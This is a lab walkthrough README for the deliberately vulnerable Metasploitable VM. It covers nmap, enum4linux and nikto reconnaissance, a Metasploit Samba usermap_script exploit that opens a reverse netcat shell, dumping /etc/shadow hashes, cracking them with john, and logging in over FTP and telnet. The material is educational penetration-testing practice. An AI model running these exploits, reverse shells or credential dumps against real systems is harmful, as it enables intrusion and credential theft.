Metasploitable Walkthrough

This README provides a step-by-step guide to identifying and exploiting vulnerabilities in the Metasploitable virtual machine for learning and practice purposes.
Prerequisites

    VirtualBox or VMware installed on your machine.
    Metasploitable VM downloaded and configured.
    Kali Linux or any penetration testing OS installed.
    Basic knowledge of Linux and penetration testing tools.

## Step 1: Initial Setup

Network Configuration
Set the network of both Metasploitable and the attacker machine to NAT Network or Host-Only to ensure they are on the same subnet.

 Metasploitable: 1

About Release
Back to the Top

    Name: Metasploitable: 1
    Date release: 19 May 2010
    Author: Metasploit
    Series: Metasploitable
    Web page: http://web.archive.org/web/20100525233058/http://blog.metasploit.com/2010/05/introducing-metasploitable.html

Download
Back to the Top
Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network. If you understand the risks, please download!

    Metasploitable.zip (Size: 545 MB)
    Download (Mirror): https://download.vulnhub.com/metasploitable/Metasploitable.zip

IN MY CASE THE TARGET IP WAS 192.168.48.145

## Step 2: Reconnaissance

# Nmap

## nmap 192.168.48.1/24 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 20:23 EST
Nmap scan report for 192.168.48.1
Host is up (0.00031s latency).
All 1000 scanned ports on 192.168.48.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 192.168.48.2
Host is up (0.00021s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
53/tcp filtered domain
MAC Address: 00:50:56:E6:DB:DE (VMware)

Nmap scan report for 192.168.48.145
Host is up (0.0021s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.1
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:57:1A:B4 (VMware)
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.48.254
Host is up (0.00025s latency).
All 1000 scanned ports on 192.168.48.254 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:FE:AC:91 (VMware)

Nmap scan report for 192.168.48.165
Host is up (0.0000050s latency).
All 1000 scanned ports on 192.168.48.165 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (5 hosts up) scanned in 21.58 seconds
                                                                 

# enum4linux 

## enum4linux -a 192.168.48.145
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan 16 20:27:26 2025

 =========================================( Target Information )=========================================
                                                                                                                     
Target ........... 192.168.48.145                                                                                    
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.48.145 )===========================
                                                                                                                     
                                                                                                                     
[+] Got domain/workgroup name: WORKGROUP                                                                             
                                                                                                                     
                                                                                                                     
 ===============================( Nbtstat Information for 192.168.48.145 )===============================
                                                                                                                     
Looking up status of 192.168.48.145                                                                                  
        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.48.145 )==================================
                                                                                                                     
                                                                                                                     
[+] Server 192.168.48.145 allows sessions using username '', password ''                                             
                                                                                                                     
                                                                                                                     
 ===============================( Getting domain SID for 192.168.48.145 )===============================
                                                                                                                     
Domain Name: WORKGROUP                                                                                               
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                 
                                                                                                                     
                                                                                                                     
 ==================================( OS information on 192.168.48.145 )==================================
                                                                                                                     
                                                                                                                     
[E] Can't get OS info with smbclient                                                                                 
                                                                                                                     
                                                                                                                     
[+] Got OS info for 192.168.48.145 from srvinfo:                                                                     
        METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)                              
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 ======================================( Users on 192.168.48.145 )======================================
                                                                                                                     
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)                                 
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 ================================( Share Enumeration on 192.168.48.145 )================================
                                                                                                                     
                                                                                                                     
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE

[+] Attempting to map shares on 192.168.48.145                                                                       
                                                                                                                     
//192.168.48.145/print$ Mapping: DENIED Listing: N/A Writing: N/A                                                    
//192.168.48.145/tmp    Mapping: OK Listing: OK Writing: N/A
//192.168.48.145/opt    Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                       
                                                                                                                     
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                                                           
//192.168.48.145/IPC$   Mapping: N/A Listing: N/A Writing: N/A
//192.168.48.145/ADMIN$ Mapping: DENIED Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.48.145 )===========================
                                                                                                                     
                                                                                                                     

[+] Attaching to 192.168.48.145 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] METASPLOITABLE
        [+] Builtin

[+] Password Info for Domain: METASPLOITABLE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                 
                                                                                                                     
                                                                                                                     
Password Complexity: Disabled                                                                                        
Minimum Password Length: 0


 ======================================( Groups on 192.168.48.145 )======================================
                                                                                                                     
                                                                                                                     
[+] Getting builtin groups:                                                                                          
                                                                                                                     
                                                                                                                     
[+]  Getting builtin group memberships:                                                                              
                                                                                                                     
                                                                                                                     
[+]  Getting local groups:                                                                                           
                                                                                                                     
                                                                                                                     
[+]  Getting local group memberships:                                                                                
                                                                                                                     
                                                                                                                     
[+]  Getting domain groups:                                                                                          
                                                                                                                     
                                                                                                                     
[+]  Getting domain group memberships:                                                                               
                                                                                                                     
                                                                                                                     
 =================( Users on 192.168.48.145 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                     
                                                                                                                     
[I] Found new SID:                                                                                                   
S-1-5-21-1042354039-2475377354-766472396                                                                             

[+] Enumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''          
                                                                                                                     
S-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)                               
S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)

 ==============================( Getting printer info for 192.168.48.145 )==============================
                                                                                                                     
No printers returned.                                                                                                


enum4linux complete on Thu Jan 16 20:27:35 2025

# nikto 

nikto -h 192.168.48.145 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.48.145
+ Target Hostname:    192.168.48.145
+ Target Port:        80
+ Start Time:         2025-01-16 20:29:03 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+ /: Server may leak inodes via ETags, header found with file /, inode: 67575, size: 45, mtime: Wed Mar 17 10:08:25 2010. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ PHP/5.2.4-2ubuntu5.10 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ PHP/5.2 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /tikiwiki/tiki-graph_formula.php: Output from the phpinfo() function was found.
+ /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5423
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8909 requests: 1 error(s) and 19 item(s) reported on remote host
+ End Time:           2025-01-16 20:29:45 (GMT-5) (42 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested





## Step 3: Exploitation



msfconsole -q
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set rhosts 192.168.48.145
rhosts => 192.168.48.145
msf6 exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 192.168.48.165:4444 
[*] Command shell session 1 opened (192.168.48.165:4444 -> 192.168.48.145:38237) at 2025-01-16 20:41:29 -0500

shell

[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
ls
bin   cdrom  etc   initrd      lib         media  opt   root  srv  tmp  var
boot  dev    home  initrd.img  lost+found  mnt    proc  sbin  sys  usr  vmlinuz
root@metasploitable:/# pwd
root@metasploitable:/# cd etc         
cd etc
root@metasploitable:/etc# cat shadow
cat shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
root@metasploitable:/etc# 


## Crack hashs

# john --wordlist='/home/kali/Desktop/rockyou.txt' hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
msfadmin         (msfadmin)     
123456789        (klog)     
batman           (sys)     
service          (service)     
4g 0:00:03:53 87.33% (ETA: 20:51:55) 0.01711g/s 52921p/s 158809c/s 158809C/s 31zadree..31oakfield
Use the "--show" option to display all of the cracked passwords reliably
Session aborted






## Other services

# ftp msfadmin@192.168.48.145
Connected to 192.168.48.145.
220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.48.145]
331 Password required for msfadmin
Password: 
230 User msfadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50125|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   6 msfadmin msfadmin     4096 Apr 28  2010 vulnerable
226 Transfer complete
ftp> pwd
Remote directory: /home/msfadmin
ftp> 


## telnet 192.168.48.145 
telnet 192.168.48.145
Trying 192.168.48.145...
Connected to 192.168.48.145.
Escape character is '^]'.
Ubuntu 8.04
metasploitable login: service
Password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
service@metasploitable:~$ pwd
/home/service
service@metasploitable:~$ 



## Step 5: Cleanup
Ensure no artifacts are left behind on the target. 
Close any open sessions and remove created files.

Notes

This guide is for educational purposes only. Always ensure you have authorization to perform penetration testing on any system.
Metasploitable is intentionally vulnerable. Use it responsibly and in controlled environments.